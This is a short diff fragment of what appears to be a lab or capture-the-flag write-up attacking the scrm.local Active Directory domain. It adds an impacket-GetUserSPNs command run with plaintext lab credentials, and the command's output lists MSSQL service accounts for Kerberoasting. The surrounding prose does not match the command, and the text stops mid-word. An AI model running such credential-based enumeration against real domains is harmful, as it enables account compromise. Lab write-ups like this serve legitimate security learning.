@@ -299,5 +299,12 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 Next ill get the domain SID
 
 ```python
+impacket-GetUserSPNs scrm.local/sqlsvc:Pegasus60@dc1.scrm.local -k -no-pass -dc-host dc1.scrm.local
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
+ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
+----------------------------  ------  --------  --------------------------  --------------------------  ----------
+MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 16:32:02.351452  2026-04-16 17:41:22.552844             
+MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 16:32:02.351452  2026-04-16 17:41:22.552844
 ```
+Then ill garb
